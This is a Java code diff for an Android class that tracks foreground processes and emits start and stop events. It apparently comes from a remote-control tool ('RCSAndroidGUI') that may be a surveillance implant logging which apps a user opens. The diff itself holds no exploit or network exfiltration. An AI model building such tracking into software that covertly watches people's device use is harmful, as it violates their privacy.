@@ -1,16 +1,24 @@
 package com.ht.RCSAndroidGUI.listener;
 
 import java.util.ArrayList;
+import java.util.Iterator;
+import java.util.TreeMap;
 
 import android.app.ActivityManager.RunningAppProcessInfo;
+import android.util.Log;
 
+import com.ht.RCSAndroidGUI.ProcessInfo;
+import com.ht.RCSAndroidGUI.ProcessStatus;
 import com.ht.RCSAndroidGUI.RunningProcesses;
 
-public class ListenerProcess extends Listener<RunningProcesses> {
+public class ListenerProcess extends Listener<ProcessInfo> {
 	/** The Constant TAG. */
 	private static final String TAG = "ListenerProcess";
 
 	private BroadcastMonitorProcess processReceiver;
+	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
+	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
+
 
 	/** The singleton. */
 	private volatile static ListenerProcess singleton;
@@ -45,9 +53,37 @@ public class ListenerProcess extends Listener<RunningProcesses> {
 		processReceiver = null;
 	}
 	
-	@Override
 	protected int dispatch(RunningProcesses processes){
-		return super.dispatch(processes);
+		
+		ArrayList<RunningAppProcessInfo> list = processes.getProcessList();
+		if (list == null) {
+			return 0;
+		}
+		currentRunning.clear();
+
+		for (Iterator iterator = list.iterator(); iterator.hasNext();) {
+			RunningAppProcessInfo running = (RunningAppProcessInfo) iterator.next();
+			if (running.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
+
+				currentRunning.put(running.processName, running);
+				if (!lastRunning.containsKey(running.processName)) {
+					Log.d("QZ", TAG + " (notification): started " + running.processName);
+					dispatch(new ProcessInfo(running, ProcessStatus.START));
+				} else {
+					lastRunning.remove(running.processName);
+				}
+			}
+		}
+
+		for (Iterator iter = lastRunning.keySet().iterator(); iter.hasNext();) {
+			RunningAppProcessInfo norun = (RunningAppProcessInfo) lastRunning.get(iter.next());
+			Log.d("QZ", TAG + " (notification): stopped " + norun.processName);
+			super.dispatch(new ProcessInfo(norun, ProcessStatus.STOP));
+		}
+
+		lastRunning = new TreeMap<String, RunningAppProcessInfo>(currentRunning);
+
+		return 0;
 	}
 
 }
